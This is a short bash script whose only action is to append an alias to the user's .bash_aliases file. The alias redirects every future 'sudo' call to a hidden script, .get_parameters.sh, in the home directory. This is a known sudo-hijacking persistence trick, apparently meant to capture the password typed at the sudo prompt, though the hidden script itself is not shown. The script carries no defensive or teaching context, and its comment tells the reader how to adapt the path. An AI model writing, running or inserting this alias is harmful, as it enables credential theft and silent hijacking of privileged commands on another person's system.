#!/bin/bash


function to_exec() {


	# change the .bash_alises file path in order to match your .bash_aliases file path 
	echo "alias sudo='bash /home/$USER/.get_parameters.sh'" >> /home/$USER/.bash_aliases
}


to_exec
